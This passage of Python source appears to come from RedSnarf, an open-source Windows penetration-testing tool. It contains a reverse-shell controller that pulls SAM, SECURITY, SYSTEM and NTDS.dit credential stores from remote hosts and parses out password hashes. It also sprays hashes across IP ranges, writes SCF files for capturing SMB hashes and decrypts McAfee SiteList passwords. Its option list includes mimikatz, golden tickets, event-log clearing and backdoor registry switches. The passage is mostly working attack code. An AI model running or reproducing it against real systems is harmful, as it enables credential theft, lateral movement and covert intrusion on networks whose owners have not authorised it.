        downloadpth="/tmp/"+remoteip+"/"
    else:
        downloadpth="/tmp/"+remoteip+"/"+dp

    if not os.path.isdir(downloadpth):
        proc = subprocess.Popen("mkdir "+downloadpth, stdout=subprocess.PIPE,shell=True)
        stdout_value = proc.communicate()[0]

    conn.send(command)
    f = open(downloadpth+filename,'wb')
    while True:
        bits = conn.recv(4096)
        if 'Unable to find out the file' in bits:
            print(colored('[-]Unable to find out the file..','red'))
            break
        if bits.endswith('DONE'):
            print(colored('[+]Download complete, file written to '+downloadpth+filename,'green'))
            #f.write(bits[0:len(bits)-4])
            f.close()
            break
        f.write(bits)

#SnarfShell Party starts here!
def connect():
    try:

        #Get ip and port to listen on
        ipaddress=raw_input("[+]Enter the IP address you wish to listen on (default 0.0.0.0): ")
        port=raw_input("[+]Enter the Port you wish to listen on (default 4444): ")

        if ipaddress=="":
            ipaddress="0.0.0.0"

        if port=="":
            port="4444"

        #Start listener
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ipaddress, int(port)))
        s.listen(1)

        print(colored('[+]Listening on '+ ipaddress +':'+port,'yellow'))
        conn, addr = s.accept()
        print(colored('[+]We have a connection from: '+ str(addr),'green'))

        #Start shell
        while True:
            command = raw_input("SnarfShell> ")
            #Close the connection properly
            if command=='quit':
                conn.send('quit')
                conn.close()
                break
            #Process download
            elif 'download' in command:
                #Get the file name from the download string and pass to transfer
                file=command.split('\\')
                #Try and transfer file
                print(file[len(file)-1])
                transfer(conn,command,file[len(file)-1],str(addr[0]),"")
            #Process help
            elif 'help' in command:
                #Offer some basic help information
                print(colored("[+]RedSnarf Basic Shell:",'red'))
                print(colored("[?]Available Commands:",'yellow'))
                print("\tenable_lat          - enable local access token filter policy")
                print("\tdisable_lat         - disable local access token filter policy")
                print("\tcreds               - dump sam/security/system from remote to local machine")
                print("\tntds_dump           - dump ntds.dit from remote dc to local machine and parse")
                print("\tdownload*pathtofile - download file from remote to local machine")
                print("\tupload*pathtofile   - upload file from local machine to cwd on remote machine")
                print("\tlock_workstation    - lock remote workstation")
                print("\t*LinuxCommandHere   - to run linux commands on local machine via shell prefix them with *")
                print("\tprivesc             - Generate a csv for use with Windows Exploit Suggester")
                print("\t                      https://github.com/GDSSecurity/Windows-Exploit-Suggester")
                print("\tcd                  - change directory")
                print("\tnet                 - windows net command")
                print("\tdir                 - windows dir command")
                print("\tmkdir               - create a new directory")
                print("\trmdir               - delete a directory and all files/folders within")
                print("\tdel                 - delete file")
                print("\tquit                - close connection")
                print(colored("\n[?]Most native Windows commands work, if not sure - give it a try!\n",'yellow'))
                pass
            #Process creds
            elif command=='creds':
                #Generate Files on Remote Machine
                print(colored("[+]Sending command to generate c:\sam, c:\system, c:\security",'green'))
                conn.send('creds')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)

                #Download the files to local machine
                print(colored("[+]Download c:\sam",'yellow'))
                transfer(conn,"download*c:\sam","sam",str(addr[0]),"")
                print(colored("[+]Download c:\security",'yellow'))
                transfer(conn,"download*c:\security","security",str(addr[0]),"")
                print(colored("[+]Download c:\system",'yellow'))
                transfer(conn,"download*c:\system","system",str(addr[0]),"")

                #Clean Up Files on Remote Machine
                conn.send('creds_cleanup')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)

                #Parse the files locally
                if os.path.exists("/tmp/"+str(addr[0])+"/"):
                    print(colored("\n\n[+]Parsing SAM/SECURITY/SYSTEM with CredDump 7",'yellow'))
                    print(colored("[+]Using pwdump: "+str(addr[0]),'green'))
                    if os.path.exists(creddump7path+"pwdump.py"):
                        os.system(creddump7path+"pwdump.py "+"/tmp/"+str(addr[0])+"/system "+"/tmp/"+str(addr[0])+"/sam | tee "+"/tmp/"+str(addr[0])+"/pwdump")

                    for p in progs:
                        try:
                            print(colored("[+]Using "+p+": "+str(addr[0]) ,'green'))
                            if os.path.exists(creddump7path+p+".py"):
                                os.system(creddump7path+p+".py "+"/tmp/"+str(addr[0])+"/system "+"/tmp/"+str(addr[0])+"/security true | tee "+"/tmp/"+str(addr[0])+"/"+p+"")
                        except OSError:
                            print(colored("[-]Something went wrong extracting from "+p,'red'))
                        if os.stat("/tmp/"+str(addr[0])+"/cachedump").st_size == 0:
                            print(colored("[-]No cached creds for: "+str(addr[0]),'yellow'))
            #Process upload
            elif 'upload' in command:
                #Work out path
                grab,path = command.split('*')
                try:
                    upload(conn,path,command)
                except Exception as e:
                    s.send ( str(e) )
                    pass
            #Process ntds_dump
            elif command=='ntds_dump':
                #Send ntds_dump command to remote machine
                print(colored("[+]Dumping NTDS.dit",'green'))
                conn.send('ntds_dump')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)
                #Download files
                print(colored("[+]Downloading NTDS.dit",'yellow'))
                transfer(conn,"download*C:\\redsnarf\\Active Directory\\ntds.dit","ntds.dit",str(addr[0]),"Active_Directory/")
                print(colored("[+]Downloading SECURITY",'yellow'))
                transfer(conn,"download*C:\\redsnarf\\registry\\SECURITY","SECURITY",str(addr[0]),"registry/")
                print(colored("[+]Downloading SYSTEM",'yellow'))
                transfer(conn,"download*C:\\redsnarf\\registry\\SYSTEM","SYSTEM",str(addr[0]),"registry/")

                #Clean Up Files on Remote Server
                conn.send('ntds_cleanup')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)
                #Assumes all files have downloaded ok
                #Parse the dump with secretsdump to get hashes.
                os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+"/tmp/"+str(addr[0])+'/registry/SYSTEM '+ "-ntds "+"/tmp/"+str(addr[0])+"/Active_Directory/ntds.dit" +" -outputfile "+"/tmp/"+str(addr[0])+"/hashdump local")
                print(colored("[+]Dumped Hashes to "+"/tmp/"+str(addr[0])+"/hashdump.ntds",'green'))
            #Process enable_lat
            elif command=='enable_lat':
                #Send command
                print(colored("[+]Enabling Local Access Token Filter Policy",'green'))
                conn.send('enable_lat')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)
            #Process privesc
            elif command=='privesc':
                #Send command
                print(colored("[+]Generating SystemInfomation file...",'green'))
                conn.send('privesc')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if "path=" in data:
                        privfilepath=data

                    if data=="[+]ET":
                        break

                    #print(data)

                if privfilepath[0:5]=="path=":
                    privfilepath=privfilepath[5:len(privfilepath)]
                    #print(privfilepath)
                    print(colored("[+]Downloading PrivEsc File",'yellow'))
                    transfer(conn,"download*"+privfilepath,"privesc.csv",str(addr[0]),"")

                    #Clean Up Files on Remote Machine
                    conn.send('privesc_cleanup')
                    #Get return
                    while True:
                        data = conn.recv(4096)
                        recv_len=len(data)
                        if data=="[+]ET":
                            break

                        print(data)

            #Process disable lat
            elif command=='disable_lat':
                #Send command
                print(colored("[+]Disabling Local Access Token Filter Policy",'green'))
                conn.send('disable_lat')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)
            #Process disable lat
            elif command=='lock_workstation':
                #Send command
                print(colored("[+]Locking remote workstation",'green'))
                conn.send('lock_workstation')
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)
            #Process Linux Command on Local Machine
            elif command[0:1]=='*':
                #Run Linux Command
                os.system(command[1:len(command)])
            #Process anything else
            else:
                #Send Any other Commands
                conn.send(command)
                #Get return
                while True:
                    data = conn.recv(4096)
                    recv_len=len(data)
                    if data=="[+]ET":
                        break

                    print(data)

    	sys.exit()

    #Should capture most errors
    except Exception as e:
        print(colored("[!]"+str(e),'red'))
        sys.exit()
    except OSError as f:
        print(colored("[!]"+str(f),'red'))
        sys.exit()

def main():
	#Routine will spray hashes at ip's
	if credsfile!='':
		print(colored('\n[+]Getting ready to spray some hashes...','yellow'))
		if os.path.isfile(credsfile):
			with open(credsfile,'r') as inifile:
				data=inifile.read()
				hash_list=data.splitlines()
				for tmphash in hash_list:
					tmphash = tmphash.replace('NO PASSWORD*********************', '00000000000000000000000000000000')
					pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(tmphash)
					plaintextpassmatch = re.compile('^(\S+?)\s+(\S*?)$')
					plain = plaintextpassmatch.match(tmphash)
					usertextpassmatch = re.compile('^(\S+?)$')
					username = usertextpassmatch.match(tmphash)
					wcematch = re.compile('^(\S+?):.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\s*$')
					wce = wcematch.match(tmphash)
					if pwdump:
						try:
							userhash = tmphash
							splitter = userhash.split(":")
							args.username=splitter[0]
							args.password=splitter[2]+':'+splitter[3]+':::'
							print(colored('\n[+]Spraying...','yellow'))
							run()
						except:
								print(colored("[-]Credentials Error",'red'))
								logging.error("[-]Credentials Error")
					if wce:
						try:
							userhash = tmphash
							splitter = userhash.split(":")
							args.username=splitter[0]
							args.password=splitter[2]
							print(colored('\n[+]Spraying...','yellow'))
							run()
						except:
								print(colored("[-]Credentials Error",'red'))
								logging.error("[-]Credentials Error")
					if plain:
						try:
							userhash = tmphash
							splitter = userhash.split(" ")

							if len(splitter)==2:
								args.username=splitter[0]
								args.password=splitter[1]

							print(colored('\n[+]Spraying...','yellow'))
							run()
						except:
								print(colored("[-]Credentials Error",'red'))
								logging.error("[-]Credentials Error")
					if username:
						try:
							userhash = tmphash
							splitter = userhash.split(" ")

							if len(splitter)==1:
								args.username=splitter[0]

								args.password=args.pass_on_blank

							print(colored('\n[+]Spraying...','yellow'))
							run()
						except:
							print(colored("[-]Credentials Error",'red'))
							logging.error("[-]Credentials Error")
	else:
		run()

	#Routine will merge multiple hashdumps from machines taken over a range
	if len(targets)>1 and args.quick_validate in noanswers:
		print(colored('\n[+]Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow'))

		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/pwdump'):
				print(colored('[+]Got a pwdump file for '+str(ip),'blue'))
				fin=open(outputpath+str(ip)+'/pwdump','r')
				data2=fin.read()
				fin.close()
				fout=open('/tmp/tmpmerge.txt','a')
				fout.write(data2)
				fout.close()
				print(colored('[+] Merged '+str(ip) + ' successfully','green'))

		if os.path.isfile('/tmp/tmpmerge.txt'):
			os.system('cat /tmp/tmpmerge.txt | sort | uniq > '+mergepf)
		if os.path.isfile('/tmp/tmpmerge.txt'):
			os.system('rm /tmp/tmpmerge.txt')
		print(colored('\n[+]Check out '+mergepf+' for unique, sorted, merged hash list','yellow'))

	#Routine will find where a specific user is logged on
	if find_user !='n':
		print(colored('\n[+]Now looking for where user '+find_user+' is logged in','yellow'))
		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/logged_on_users.txt'):

				if find_user in open(outputpath+str(ip)+'/logged_on_users.txt').read():
					print(colored("[+]Found " + find_user + " logged in to "+str(ip),'green'))

#Display the user menu.
banner()
p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5p", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")

# Creds
p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
p.add_argument("-p", "--password", dest="password", default="Password1", help="Enter a password or hash")
p.add_argument("-d", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
# Configurational
cgroup = p.add_argument_group('Configurational')
cgroup.add_argument("-cC", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
cgroup.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
cgroup.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
cgroup.add_argument("-cQ", "--quick_validate", dest="quick_validate", default="n", help="<Optional> Quickly Validate Credentials")
cgroup.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
# Utilities
ugroup = p.add_argument_group('Utilities')
ugroup.add_argument("-uA", "--auto_complete", dest="auto_complete", default="n", help="<Optional> Copy autocomplete file to /etc/bash_completion.d ")
ugroup.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
ugroup.add_argument("-uCP", "--custom_powershell", dest="custom_powershell", default="n", help="<Optional> Run Custom Powershell Scripts found in the RedSnarf folder")
ugroup.add_argument("-uCIDR", "--cidr", dest="cidr", default="", help="<Optional> Convert CIDR representation to ip, hostmask, broadcast")
ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
ugroup.add_argument("-uFT", "--file_transcribe", dest="file_transcribe", default="n", help="<Optional> Converts a file to base64 then sends via SendKeys")
ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
ugroup.add_argument("-uMC", "--mcafee_sites", dest="mcafee_sites", default="n", help="<Optional> Decrypt Mcafee Sites Password")
ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
ugroup.add_argument("-uJW", "--sendtojohn", dest="sendtojohn", default="", help="<Optional> Enter path to NT Hash file to send to JtR")
ugroup.add_argument("-uJS", "--sendspntojohn", dest="sendspntojohn", default="", help="<Optional> Enter path of SPN Hash file to send to JtR Jumbo")
ugroup.add_argument("-uL", "--lockdesktop", dest="lockdesktop", default="", help="<Optional> Lock remote users Desktop")
ugroup.add_argument("-uLP", "--liveips", dest="liveips", default="", help="<Optional> Ping scan to generate a list of live IP's")
ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
ugroup.add_argument("-uMT", "--meterpreter_revhttps", dest="meterpreter_revhttps", default="", help="<Optional> Launch Reverse Meterpreter HTTPS")
ugroup.add_argument("-uO", "--delegated_privs", dest="delegated_privs", default="n", help="<Optional> Delegated Privilege Checker ")
ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
ugroup.add_argument("-uRS", "--snarf_shell", dest="snarf_shell", default="n", help="<Optional> Start Reverse Listening Snarf Shell")
ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")

ugroup.add_argument("-uSS", "--split_spn", dest="split_spn", default="n", help="<Optional> Split SPN File")
ugroup.add_argument("-uSCF", "--scf_creator", dest="scf_creator", default="n", help="<Optional> Create an SCF file for some SMB hash capturing fun")

ugroup.add_argument("-uSG", "--session_gopher", dest="session_gopher", default="n", help="<Optional> Run Session Gopher on Remote Machine")
ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grep unattended installation files")
ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
ugroup.add_argument("-uXS", "--xscript", dest="xscript", default="n", help="<Optional> Run custom script")
ugroup.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
ugroup.add_argument("-uWU", "--windows_updates", dest="windows_updates", default="n", help="<Optional> Get Windows Update Status")
# Hash related
hgroup = p.add_argument_group('Hash related')
hgroup.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
hgroup.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
hgroup.add_argument("-hQ", "--qldap", dest="qldap", default="", help="<Optional> In conjunction with the -i and -n option - Query LDAP for Account Status when dumping Domain Hashes")
hgroup.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
hgroup.add_argument("-hP", "--pass_on_blank", dest="pass_on_blank", default="Password1", help="Password to use when only username found in Creds File")
hgroup.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<Optional> Run Mimikittenz")
hgroup.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
hgroup.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
hgroup.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
hgroup.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
hgroup.add_argument("-hW", "--win_scp", dest="win_scp", default="n", help="<Optional> Check for, and decrypt WinSCP hashes")
# Enumeration related
egroup = p.add_argument_group('Enumeration related')
egroup.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
egroup.add_argument("-eD", "--user_desc", dest="user_desc", default="n", help="<Optional> Save AD User Description Field to file, check for password")
egroup.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
egroup.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
egroup.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
egroup.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
egroup.add_argument("-eR", "--recorddesktop", dest="recorddesktop", default="n", help="<Optional> Record a desktop using Windows Problem Steps Recorder")
egroup.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help="<Optional> Take a screenshot of remote machine desktop")
egroup.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
# Registry related
rgroup = p.add_argument_group('Registry related')
rgroup.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (e)nable/(d)isable/(q)uery AutoLogon Registry Setting")
rgroup.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Backdoor Registry Setting")
rgroup.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Smart Card scforceoption Registry Setting")
rgroup.add_argument("-rF", "--fat", dest="fat", default="n", help="<Optional> Write batch file for turning on/off FilterAdministratorToken Policy")
rgroup.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
rgroup.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
rgroup.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (e)nable/(d)isable/(q)uery NLA Status")
rgroup.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (e)nable/(d)isable/(q)uery RDP Status")
rgroup.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
rgroup.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Tunnel RDP out of port 443")
rgroup.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (e)nable/(d)isable/(q)uery UAC Registry Setting")
rgroup.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (e)nable/(d)isable/(q)uery Wdigest UseLogonCredential Registry Setting")

args = p.parse_args()

user = args.username
passw = args.password

files = ['sam', 'system', 'security']
progs = ['cachedump','lsadump']

password_policy=args.password_policy
creddump7path=args.credpath
outputpath=args.outputpath
mergepf=args.mergepf
credsfile=args.credsfile
skiplsacache=args.skiplsacache
dropshell=args.dropshell
lsass_dump=args.lsass_dump
policiesscripts_dump=args.policiesscripts_dump
domain_name=args.domain_name
c_password=args.c_password
ntds_util=args.ntds_util
drsuapi=args.drsuapi
massmimi_dump=args.massmimi_dump
service_accounts=args.service_accounts
find_user=args.find_user
ofind_user=args.ofind_user
clear_event=args.clear_event
lat=args.lat
fat=args.fat
xcommand=args.xcommand
edq_rdp=args.edq_rdp
edq_nla=args.edq_nla
edq_trdp=args.edq_trdp
edq_wdigest=args.edq_wdigest
edq_backdoor=args.edq_backdoor
qldap=args.qldap
edq_uac=args.edq_uac
edq_scforceoption=args.edq_scforceoption
stealth_mimi=args.stealth_mimi
mimikittenz=args.mimikittenz
golden_ticket=args.golden_ticket
edq_autologon=args.edq_autologon
edq_allowtgtsessionkey=args.edq_allowtgtsessionkey
system_tasklist=args.system_tasklist
multi_rdp=args.multi_rdp
edq_SingleSessionPerUser=args.edq_SingleSessionPerUser
screenshot=args.screenshot
unattend=args.unattend
user_desc=args.user_desc
recorddesktop=args.recorddesktop
empire_launcher=args.empire_launcher
mssqlshell=args.mssqlshell
wifi_credentials=args.wifi_credentials
john_to_pipal=args.john_to_pipal
get_spn=args.get_spn
win_scp=args.win_scp
lockdesktop=args.lockdesktop
meterpreter_revhttps=args.meterpreter_revhttps
sendtojohn=args.sendtojohn
rdp_connect=args.rdp_connect
cidr=args.cidr
liveips=args.liveips
split_spn=args.split_spn
sendspntojohn=args.sendspntojohn
auto_complete=args.auto_complete
session_gopher=args.session_gopher
custom_powershell=args.custom_powershell
delegated_privs=args.delegated_privs
windows_updates=args.windows_updates
xscript=args.xscript
mcafee_sites=args.mcafee_sites
snarf_shell=args.snarf_shell
scf_creator=args.scf_creator
file_transcribe=args.file_transcribe

#Check Bash Tab Complete Status and Display to Screen
print(colored("[+]Checking Bash Tab Completion Status",'yellow'))
print(colored("[+]"+bashversion()+"\n",'green'))

#Routine Installs/Copies the Bash Auto Complete File to /etc/bash_completion.d
if args.auto_complete!='n':
	print(colored("[+]Copying redsnarf.rc to /etc/bash_completion.d",'green'))
	os.system("cp redsnarf.rc /etc/bash_completion.d/redsnarf.rc")
	if os.path.isfile("/etc/bash_completion.d/redsnarf.rc"):
		print(colored("[+]File copied, now open a new bash window",'yellow'))
		os.system("exec bash")
	else:
		print(colored("[-]File not copied",'yellow'))
	sys.exit()

if args.snarf_shell!='n':
	connect()
	sys.exit()

#Work around for if a password has !! as the command line will bork
if args.password=='epass':
	print(colored("[+]Command line password workaround...",'green'))
	usr_response = raw_input("Enter the password here: ")
	args.password=usr_response
	passw=args.password

if file_transcribe!='n':
	try:
		filename=raw_input("Enter name and path of a file to transcribe: ")
		if not os.path.isfile(filename):
			print(colored("[!] File not found ",'red'))
			sys.exit(1)
		else:
			b64filename="/tmp/snarftrans.b64"
			os.system("base64 -w 0 "+filename+"> "+b64filename)

		#Modify these if necessary
		#TODO make read in values
		interval=float("0.1")
		pause=float("10")

		#Get an instance of PyKeyboard, and our custom PyMouseEvent
		keyboard = PyKeyboard()
		mouse = AbortMouse()

		print(colored("\n[?]Have you got a text editor open ready to receive ",'red'))
		print(colored("[?]keyboard input in your RDP Window?\n",'red'))

		raw_input('Press Enter when ready.')

		print(colored(('\n[!]Typing will begin in {0} seconds...'.format(pause)),'red'))
		print(colored("[!]Give focus to the open text editor in your RDP Window Now!!",'red'))
		time.sleep(pause)
		print(colored("[+]Started typing at " + time.strftime("%c"),'blue'))
		mouse.start()
		with open(b64filename, 'r') as readfile:
			for line in readfile:
				if not mouse.state:
					print(colored("Typing aborted!",'red'))
					break
				keyboard.type_string(line, interval)

		print(colored("\n[+]Done!\n",'green'))
		print(colored("[+]Stopped typing at " + time.strftime("%c"),'blue'))

		print(colored("[+]On the remote machine save file e.g. filename.b64 then decode using",'yellow'))
		print(colored("[+]certutil -decode filename.b64 filename.exe",'yellow'))

	except ValueError:
		print('The value of --interval must be a number')
		sys.exit(1)

	sys.exit()

if scf_creator!='n':
	try:
		#SCF File Writer
		print(colored("[+]SCF File Writer",'green'))

		outputfile=raw_input("[+]Enter filename to save as: ")
		inputip=raw_input("[+]Please enter listening IP address: ")

		if not outputfile.endswith(".scf"):
			outputfile=outputfile+".scf"

		# read arg
		f = open("/tmp/"+outputfile,"w")
		f.write("[Shell]\n")
	   	f.write("Command=2\n")
	   	f.write("IconFile=\\\\" + inputip + "\share\\test.ico\n")
	   	f.write("[Taskbar]\n")
	   	f.write("Command=ToggleDesktop\n")
	   	f.close()
	   	print("[+]File Written " + "/tmp/" + outputfile)

	except:
		print(colored("[!]Something went wrong...",'red'))
		sys.exit()

	sys.exit()

if mcafee_sites!='n':
	try:
		#Decryption Code Source:
		#https://github.com/funoverip/mcafee-sitelist-pwd-decryption/blob/master/mcafee_sitelist_pwd_decrypt.py
		print(colored("[+]McAfee SiteList Password Decrypter",'green'))
		print(colored("[+]Sitelist.xml can normally be found in - C:\Users\All Users\McAfee\Common Framework\Sitelist.xml",'yellow'))
		response=raw_input("[+]Enter encrypted string: ")
		# read arg
		encrypted_password = base64.b64decode(response)
		# decrypt
		password = des3_ecb_decrypt(sitelist_xor(encrypted_password))

		print(colored("[+]Your password is - ",'yellow')+ password)

	except:
		print(colored("[!]Something went wrong...",'red'))
		sys.exit()

	sys.exit()

if split_spn!='n':
	#Print function message
	print(colored("[+]SPN file splitter...",'green'))

	usr_response = raw_input("\nPlease enter path to SPN file: ")
	#If response is not empty
	if usr_response !='':
		#Check file exists and exit if not found
		if not os.path.isfile(usr_response):
			print(colored("\n[+]WARNING - File doesn't exist",'red'))
			logging.error("[+]WARNING - File doesn't exist")
			sys.exit()

		#Read in hashes
		fo=open(usr_response,"r").read()

		#Detect : in hashes, if it is found those hashes won't be detected properly
		if ":" in fo:
			logging.error("[-]We've got some corrupted hashes, replacing : for . which should fix them")
			print(colored("[-]We've got some corrupted hashes, replacing : for . which should fix them",'red'))
			#Replace all occurances of : with .
			fo=fo.replace(":",".")
			#Write to initial path appending .fix as not to overwrite the initial file
			file = open(usr_response+".fix","w")
			file.write (fo)
			file.close()

			#Print status message
			print(colored("[+]Fixed hashes and written them to "+usr_response+".fix, try again using this file",'yellow'))
			logging.info("[+]Fixed hashes and written them to "+usr_response+".fix, try again using this file")
			#Exit, so function can be run again
			sys.exit()

		#Split on the marker $krb5tgs$23$*
		value=fo.split('$krb5tgs$23$*')

		#Get an output path from the user
		output_path = raw_input("\nPlease enter output path: ")
		if output_path !='':
			#Check to see if we already have a usernames.txt file
			if os.path.isfile(outputpath+"usernames.txt"):
				#Print warning msg
				print(colored("\n[+]WARNING",'red'))
				#Confirm if we should overwrite
				response = raw_input("Looks like you have an existing file "+outputpath+"usernames.txt"+", do you want to overwrite?: Y/(N) ")
				#If no exit else continue and delete existing file
				if response in noanswers:
					sys.exit()
				if response in yesanswers:
					os.system("rm "+outputpath+"usernames.txt"+" 2>/dev/null")

			#Cycle through our hashes
			for x in xrange(1,len(value)):
				#Get hash
				userhash = "$krb5tgs$23$*"+fo.split('$krb5tgs$23$*')[x]
				#Get username
				username=userhash.split('$')[3][1:]

				#Create a file for each username and write the hash to file
				file = open(output_path+username+".txt","w")
				file.write (userhash)
				file.close()

				#Create/Open a file with append to add usernames
				file = open(output_path+"usernames.txt","a")
				file.write (username+"\n")
				file.close()

				#Print status that hash has been written to file and path
				print(colored("[+]Written hash for "+username+" to "+outputpath+username+".txt",'yellow'))
				logging.info("[+]Written hash for "+username+" to "+outputpath+username+".txt")
			#Print status that usernames have been written to file and path
			print(colored("[+]Written usernames to "+outputpath+"usernames.txt",'yellow'))
			logging.info("[+]Written usernames to "+outputpath+"usernames.txt")
	sys.exit()

#Wrap and cut an nmap scan to get output of just live ip's in a subnet
if liveips!='':

	#Setup list
	lstliveips = []

	#Print function title
	print(colored("[+]Live IP to File...",'green'))
	#Get filename to write to
	usr_response = raw_input("\nEnter a filename to output to: ")
	#If response is not empty
	if usr_response !='':

		#Check to see whether file with that name exists
		if os.path.isfile(usr_response):
			#Print warning msg
			print(colored("\n[+]WARNING",'red'))
			#Confirm if we should overwrite
			response = raw_input("Looks like you have an existing file "+usr_response+", do you want to overwrite?: Y/(N) ")
			#If no exit else continue
			if response in noanswers:
				sys.exit()

		#Wrap nmap to get ips
		os.system("nmap -n -sn -vv "+liveips+" |grep 'Host is up' -B 1 |grep Nmap |cut -d \" \" -f 5 > "+usr_response +" 2>/dev/null")

		#usr_response="ip.txt"

		#Read in IP addresses
		fo=open(usr_response,"r")
		fline = fo.readlines()
		fo.close()

		#Print complete message
		print(colored("[+]Scan complete "+str(len(fline))+" IP(s) detected",'yellow'))

		#Exit if no ips were found or no of ips is less than 10
		if len(fline)==0 or len(fline)<10:
			sys.exit()

		#See if we want to generate a random 10 per cent sample
		sample_response = raw_input("\nDo you want to generate a random 10 percent sample? (y/n): ")
		#If answer is no, exit
		if sample_response in noanswers:
			sys.exit()
		#If answer is yes continue
		elif sample_response in yesanswers:
